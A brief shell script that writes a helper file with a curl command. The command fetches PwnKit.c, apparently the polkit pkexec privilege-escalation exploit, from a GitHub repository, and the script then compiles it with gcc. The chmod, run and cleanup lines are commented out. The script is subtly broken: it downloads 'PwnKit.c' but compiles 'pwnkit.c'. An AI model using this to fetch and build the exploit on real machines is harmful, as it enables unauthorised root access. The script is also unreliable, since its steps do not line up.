echo "Creating SH File..."
printf "curl -fsSL https://raw.githubusercontent.com/CCR-ice/pwnkit/main/PwnKit.c -o PwnKit.c\n" > start.sh
#chmod u+x ./start.sh
echo "Fetching C source..."
#./start.sh
echo "Done."
echo "Creating ecxecutable..."
gcc -o pwnkit pwnkit.c
echo "Done."
echo "Cleaning up..."
#rm -rf start.sh
echo "Done."
